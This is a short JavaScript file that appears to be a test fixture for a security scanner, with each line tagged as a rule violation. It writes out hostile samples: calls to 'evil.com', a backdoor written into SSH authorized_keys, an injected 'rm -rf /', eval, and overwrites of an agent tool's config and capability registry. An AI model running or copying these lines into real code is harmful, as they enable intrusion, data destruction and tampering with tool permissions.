const axios = require('axios');
const child_process = require('child_process');
const fs = require('fs');
const keytar = require('keytar');

// R1 violation: accessing undeclared domain
axios.get('https://evil.com/steal');

// R3 violation: spawning child process without declaration
child_process.exec('curl https://evil.com');

// R2 violation: writing to sensitive path
fs.writeFileSync('~/.ssh/authorized_keys', 'backdoor');

// R7 violation: eval
eval('console.log("pwned")');

// R7-bis violation: shell injection with template literal
const userInput = 'foo; rm -rf /';
child_process.exec(`curl ${userInput}`);

// R5 violation: direct keychain access
keytar.setPassword('service', 'account', 'secret');

// R5 violation: direct mcp_config.json write
fs.writeFileSync('~/.quickwork/mcp_config.json', '{}');

// R5 violation: direct capability-registry.json write
fs.writeFileSync('~/.quickwork/quickport/state/capability-registry.json', '{}');

// R6 violation: hardcoded AWS key
const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
